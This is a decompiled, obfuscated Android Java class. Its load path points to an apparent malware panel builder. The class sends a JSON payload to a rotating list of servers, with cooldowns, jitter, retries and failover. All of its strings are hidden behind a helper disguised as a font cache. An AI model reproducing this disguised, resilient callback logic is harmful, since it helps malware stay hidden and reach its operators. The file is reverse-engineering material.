package v.s;

import app.mobilex.plus.util.TypefaceCache;
import java.io.Serializable;
import java.net.ConnectException;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.regex.Pattern;
import javax.net.ssl.SSLException;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class dRgjPdbL8ZDxwG4h extends jh03IwKTfxTtT1U implements NhN5GSKLYh6STld4 {
    public final /* synthetic */ JSONObject b1EoSIRjJHO5;
    public final /* synthetic */ String ibVTtJUNfrGYbW;
    public final /* synthetic */ boolean xDyLpEZyrcKVe0;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dRgjPdbL8ZDxwG4h(boolean z, String str, JSONObject jSONObject, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q) {
        super(2, b9xroaxfr1fmoo2q);
        this.xDyLpEZyrcKVe0 = z;
        this.ibVTtJUNfrGYbW = str;
        this.b1EoSIRjJHO5 = jSONObject;
    }

    @Override // v.s.NhN5GSKLYh6STld4
    public final Object b1EoSIRjJHO5(Object obj, Object obj2) {
        return ((dRgjPdbL8ZDxwG4h) dDIMxZXP1V8HdM((wh3Lv6S5rs6zqjV) obj, (b9xRoaXFR1fmOO2Q) obj2)).vekpFI4d1Nc4fakF(Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM);
    }

    @Override // v.s.CWIOrUfHtKyaxQib0W
    public final b9xRoaXFR1fmOO2Q dDIMxZXP1V8HdM(Object obj, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q) {
        return new dRgjPdbL8ZDxwG4h(this.xDyLpEZyrcKVe0, this.ibVTtJUNfrGYbW, this.b1EoSIRjJHO5, b9xroaxfr1fmoo2q);
    }

    @Override // v.s.CWIOrUfHtKyaxQib0W
    public final Object vekpFI4d1Nc4fakF(Object obj) {
        boolean zMatches;
        SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
        long jCurrentTimeMillis = System.currentTimeMillis();
        if (ktukzhfmAkOuMU.Ee8d2j4S9Vm5yGuR > 0 && jCurrentTimeMillis < ktukzhfmAkOuMU.Ee8d2j4S9Vm5yGuR && !this.xDyLpEZyrcKVe0) {
            long j = (ktukzhfmAkOuMU.Ee8d2j4S9Vm5yGuR - jCurrentTimeMillis) / ((long) 1000);
            return new roAK4OF9CtSmlCJgpQ(new VSZeS5mia3yEXbAe(new Exception(TypefaceCache.obtain("000B0042006F00B700CF00EA00CA00BF00630023000B00D400AA00FF00E100A200310060005E009500B000BD00C700B4003A00360013009500F500AB00C000BE0063007F005500C7") + j + "s)")));
        }
        ArrayList arrayListDDIMxZXP1V8HdM = ktukzhfmAkOuMU.dDIMxZXP1V8HdM();
        if (arrayListDDIMxZXP1V8HdM.isEmpty()) {
            TypefaceCache.obtain("000D0079001B009700F100B100D700AB00630043006900AB00E300FF00D100A8002D00700052008000E500AD00D700A30062");
            return new roAK4OF9CtSmlCJgpQ(new VSZeS5mia3yEXbAe(new Exception(TypefaceCache.obtain("001300770055008200FC00FF00F30097000A00360055008800E400FF00D100A8002D00700052008000E500AD00D700A3"))));
        }
        try {
            Thread.sleep((long) (Math.random() * ((double) 280)));
        } catch (Exception unused) {
        }
        int size = arrayListDDIMxZXP1V8HdM.size();
        int i = 0;
        int i2 = 0;
        Exception exc = null;
        while (i2 < size) {
            Object obj2 = arrayListDDIMxZXP1V8HdM.get(i2);
            i2++;
            String str = (String) obj2;
            ktukzhfmAkOuMU ktukzhfmakoumu = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
            try {
                zMatches = Pattern.compile(TypefaceCache.obtain("001D004A005F009C00A100F3008100BA001F00380067008300EB00EE009E00F4003E004A001500BB00F400A4008300EB0070006B006700C900CC00BB00C900F6006F0025004600C3")).matcher(new URL(str).getHost()).matches();
            } catch (Exception unused2) {
                zMatches = false;
            }
            try {
                ktukzhfmAkOuMU ktukzhfmakoumu2 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                Serializable serializableRCHnHJBAlOpNI5 = ktukzhfmAkOuMU.rCHnHJBAlOpNI5(str, this.ibVTtJUNfrGYbW, new JSONObject(this.b1EoSIRjJHO5.toString()));
                if (!(serializableRCHnHJBAlOpNI5 instanceof VSZeS5mia3yEXbAe)) {
                    if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(ktukzhfmAkOuMU.w9sT1Swbhx3hs, str)) {
                        TypefaceCache.obtain("001000610052009300F300B700DB00A900240036004F008800B000A800DD00B50028007F0055008000B0008A00E0008B");
                        ktukzhfmAkOuMU.w9sT1Swbhx3hs = str;
                    }
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(58))) {
                        ktukzhfmAkOuMU.vekpFI4d1Nc4fakF.set(0);
                    }
                    ktukzhfmAkOuMU.ibVTtJUNfrGYbW = System.currentTimeMillis();
                    return new roAK4OF9CtSmlCJgpQ(serializableRCHnHJBAlOpNI5);
                }
                Throwable thDDIMxZXP1V8HdM = roAK4OF9CtSmlCJgpQ.dDIMxZXP1V8HdM(serializableRCHnHJBAlOpNI5);
                e = thDDIMxZXP1V8HdM instanceof Exception ? (Exception) thDDIMxZXP1V8HdM : null;
                TypefaceCache.obtain("000B0042006F00B700B000BA00C000B5002C0064001B008800FE00FF");
                if (e != null) {
                    e.getMessage();
                }
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, ktukzhfmAkOuMU.w9sT1Swbhx3hs)) {
                    ktukzhfmAkOuMU.w9sT1Swbhx3hs = null;
                }
                exc = e;
            } catch (ConnectException e) {
                e = e;
                ktukzhfmAkOuMU ktukzhfmakoumu3 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                TypefaceCache.obtain("000000790055008900F500BC00C600AE002C0078001B008500FC00B000D100AC00260072001B008100FF00AD0092");
                e.getMessage();
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, ktukzhfmAkOuMU.w9sT1Swbhx3hs)) {
                    ktukzhfmAkOuMU.w9sT1Swbhx3hs = null;
                }
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(58))) {
                    ktukzhfmAkOuMU.vekpFI4d1Nc4fakF.incrementAndGet();
                }
                exc = e;
            } catch (SocketTimeoutException e2) {
                e = e2;
                ktukzhfmAkOuMU ktukzhfmakoumu4 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                TypefaceCache.obtain("0017007F0056008200FF00AA00C600E700250079004900C7");
                e.getMessage();
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, ktukzhfmAkOuMU.w9sT1Swbhx3hs)) {
                    ktukzhfmAkOuMU.w9sT1Swbhx3hs = null;
                }
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(58))) {
                    ktukzhfmAkOuMU.vekpFI4d1Nc4fakF.incrementAndGet();
                }
                if (!zMatches && i < 2) {
                    i++;
                    roAK4OF9CtSmlCJgpQ roak4of9ctsmlcjgpqVekpFI4d1Nc4fakF = ktukzhfmAkOuMU.vekpFI4d1Nc4fakF(str, this.ibVTtJUNfrGYbW, new JSONObject(this.b1EoSIRjJHO5.toString()));
                    if (roak4of9ctsmlcjgpqVekpFI4d1Nc4fakF != null && !(roak4of9ctsmlcjgpqVekpFI4d1Nc4fakF.w9sT1Swbhx3hs instanceof VSZeS5mia3yEXbAe)) {
                        return roak4of9ctsmlcjgpqVekpFI4d1Nc4fakF;
                    }
                }
            } catch (UnknownHostException e3) {
                e = e3;
                ktukzhfmAkOuMU ktukzhfmakoumu5 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                TypefaceCache.obtain("00070058006800C700F200B300DD00A400280073005F00C700F600B000C000E7");
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, ktukzhfmAkOuMU.w9sT1Swbhx3hs)) {
                    ktukzhfmAkOuMU.w9sT1Swbhx3hs = null;
                }
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(58))) {
                    ktukzhfmAkOuMU.vekpFI4d1Nc4fakF.incrementAndGet();
                }
                if (!zMatches && i < 2) {
                    i++;
                    roAK4OF9CtSmlCJgpQ roak4of9ctsmlcjgpqVekpFI4d1Nc4fakF2 = ktukzhfmAkOuMU.vekpFI4d1Nc4fakF(str, this.ibVTtJUNfrGYbW, new JSONObject(this.b1EoSIRjJHO5.toString()));
                    if (roak4of9ctsmlcjgpqVekpFI4d1Nc4fakF2 != null && !(roak4of9ctsmlcjgpqVekpFI4d1Nc4fakF2.w9sT1Swbhx3hs instanceof VSZeS5mia3yEXbAe)) {
                        return roak4of9ctsmlcjgpqVekpFI4d1Nc4fakF2;
                    }
                }
            } catch (SSLException e4) {
                e = e4;
                ktukzhfmAkOuMU ktukzhfmakoumu6 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                TypefaceCache.obtain("00100045007700C700F500AD00C000A800310036005D008800E200FF");
                e.getMessage();
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, ktukzhfmAkOuMU.w9sT1Swbhx3hs)) {
                    ktukzhfmAkOuMU.w9sT1Swbhx3hs = null;
                }
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(58))) {
                    ktukzhfmAkOuMU.vekpFI4d1Nc4fakF.incrementAndGet();
                }
                if (!zMatches && i < 2) {
                    i++;
                    roAK4OF9CtSmlCJgpQ roak4of9ctsmlcjgpqVekpFI4d1Nc4fakF3 = ktukzhfmAkOuMU.vekpFI4d1Nc4fakF(str, this.ibVTtJUNfrGYbW, new JSONObject(this.b1EoSIRjJHO5.toString()));
                    if (roak4of9ctsmlcjgpqVekpFI4d1Nc4fakF3 != null && !(roak4of9ctsmlcjgpqVekpFI4d1Nc4fakF3.w9sT1Swbhx3hs instanceof VSZeS5mia3yEXbAe)) {
                        return roak4of9ctsmlcjgpqVekpFI4d1Nc4fakF3;
                    }
                }
            } catch (Exception e5) {
                e = e5;
                ktukzhfmAkOuMU ktukzhfmakoumu7 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                TypefaceCache.obtain("000600640049008800E200FF00D400A800310036");
                e.getMessage();
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, ktukzhfmAkOuMU.w9sT1Swbhx3hs)) {
                    ktukzhfmAkOuMU.w9sT1Swbhx3hs = null;
                }
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(58))) {
                    ktukzhfmAkOuMU.vekpFI4d1Nc4fakF.incrementAndGet();
                }
                exc = e;
            }
        }
        ktukzhfmAkOuMU ktukzhfmakoumu8 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
        TypefaceCache.obtain("0002005A007700C700C5008D00FE00B400630070005A008E00FC00BA00D600E700250079004900C7");
        TypefaceCache.obtain("006D0036006F009500F900BA00D600E7");
        arrayListDDIMxZXP1V8HdM.size();
        TypefaceCache.obtain("00630043006900AB00E300FF009900E700070079007300C900B0009300D300B400370036005E009500E200B000C000FD0063");
        if (exc != null) {
            exc.getMessage();
        }
        if (exc == null) {
            exc = new Exception(TypefaceCache.obtain("0002007A005700C700E000BE00DC00A2002F0036006E00B500DC00AC009200A10022007F0057008200F4"));
        }
        return new roAK4OF9CtSmlCJgpQ(new VSZeS5mia3yEXbAe(exc));
    }
}
